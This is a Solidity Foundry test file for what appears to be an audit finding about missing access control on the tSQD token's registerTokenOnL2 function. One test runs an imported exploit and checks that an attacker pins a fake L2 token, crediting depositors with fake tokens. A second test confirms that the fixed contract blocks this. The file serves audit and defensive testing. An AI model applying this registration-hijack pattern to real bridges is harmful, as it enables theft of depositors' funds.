// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Admin,
    ArbToken,
    Exploit,
    GatewayRouter,
    L1CustomGateway,
    tSQDFixed
} from "./31549-h-04-lack-of-access-control-on-tsqds-registertokenonl2-pasho.sol";

contract Finding31549Test is Test {
    uint256 internal constant AMOUNT = 1000 ether;
    address internal constant DEPOSITOR = 0x000000000000000000000000000000000000bEEF;

    function test_exploit_fake_l2_token_is_minted() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.fakeCredited(), AMOUNT, "1000 fake tokens credited");
        assertEq(e.realCredited(), 0, "real tSQD not minted");
        assertEq(e.fake().balanceOf(DEPOSITOR), AMOUNT, "depositor fake balance");
        assertEq(e.gateway().l1ToL2Token(address(e.token())), address(e.fake()), "gateway pinned the fake");
        assertEq(e.realL2().balanceOf(DEPOSITOR), 0, "real balance stays 0");
    }

    function test_control_only_owner_registers_the_real_token() public {
        L1CustomGateway gateway = new L1CustomGateway();
        GatewayRouter router = new GatewayRouter();
        ArbToken fake = new ArbToken("fSQD", address(gateway));
        ArbToken realL2 = new ArbToken("tSQD", address(gateway));
        Admin admin = new Admin();
        tSQDFixed token = new tSQDFixed(address(gateway), address(router), address(admin));

        (bool ok,) = address(token).call(
            abi.encodeWithSelector(
                token.registerTokenOnL2.selector, address(fake), 0, 0, 0, 0, 0, 0, 0, address(this)
            )
        );
        assertFalse(ok, "attacker register reverted");
        assertEq(gateway.l1ToL2Token(address(token)), address(0), "nothing pinned");

        admin.register(token, address(realL2));
        assertEq(gateway.l1ToL2Token(address(token)), address(realL2), "owner pinned the real L2 token");

        gateway.finalizeInboundTransfer(address(token), DEPOSITOR, AMOUNT);
        assertEq(realL2.balanceOf(DEPOSITOR), AMOUNT, "user receives 1000 real tSQD");
        assertEq(fake.balanceOf(DEPOSITOR), 0, "fake token stays at 0");
    }
}
